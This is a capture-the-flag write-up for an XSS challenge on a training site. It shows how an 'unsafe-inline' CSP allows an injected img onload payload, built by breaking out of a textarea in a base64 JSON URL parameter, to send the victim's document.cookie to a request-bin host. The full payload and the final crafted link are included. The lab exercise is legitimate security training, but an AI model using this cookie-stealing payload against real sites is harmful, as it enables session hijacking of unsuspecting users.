# XSS

The csp is the following:
```
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; style-src 'unsafe-inline' 'self' https://cdn.jsdelivr.net
```

First of all, I wanted to check the "Copy Link" functionality, and then visiting the url copied, with the console open, we see that it unpacks the url param in:
```json
{"players":[{"name":"Player1","level":1,"bufs":0,"rbufs":0,"note":" "},{"name":"Player2","level":1,"bufs":0,"rbufs":0,"note":" "}]}
```

So our note goes in the json.

Now, let's find a working exploit.

'unsafe-inline' lets us execute any script dynamically, so the concept is to load an image, and `onload` redirect the page to my request bin.

```
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/61/HTML5_logo_and_wordmark.svg/1200px-HTML5_logo_and_wordmark.svg.png" onload="window.location.href='https://requestbin.training.jinblack.it/t8drnzt8?cookie='+document.cookie">
```

Now attach the payload to the json:

```json
{"players":[{"name":"Player1","level":1,"bufs":0,"rbufs":0,"note":"</textarea><img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/6/61/HTML5_logo_and_wordmark.svg/1200px-HTML5_logo_and_wordmark.svg.png\" onload=\"window.location.href='https://requestbin.training.jinblack.it/t8drnzt8?cookie='+document.cookie\">"}]}
```

And get the base64 of the payload. Then generate this link:

```
http://pointer.ctf.offdef.it/eyJwbGF5ZXJzIjpbeyJuYW1lIjoiUGxheWVyMSIsImxldmVsIjoxLCJidWZzIjowLCJyYnVmcyI6MCwibm90ZSI6IjwvdGV4dGFyZWE+PGltZyBzcmM9XCJodHRwczovL3VwbG9hZC53aWtpbWVkaWEub3JnL3dpa2lwZWRpYS9jb21tb25zL3RodW1iLzYvNjEvSFRNTDVfbG9nb19hbmRfd29yZG1hcmsuc3ZnLzEyMDBweC1IVE1MNV9sb2dvX2FuZF93b3JkbWFyay5zdmcucG5nXCIgb25sb2FkPVwid2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8vcmVxdWVzdGJpbi50cmFpbmluZy5qaW5ibGFjay5pdC90OGRybnp0OD9jb29raWU9Jytkb2N1bWVudC5jb29raWVcIj4ifV19
```
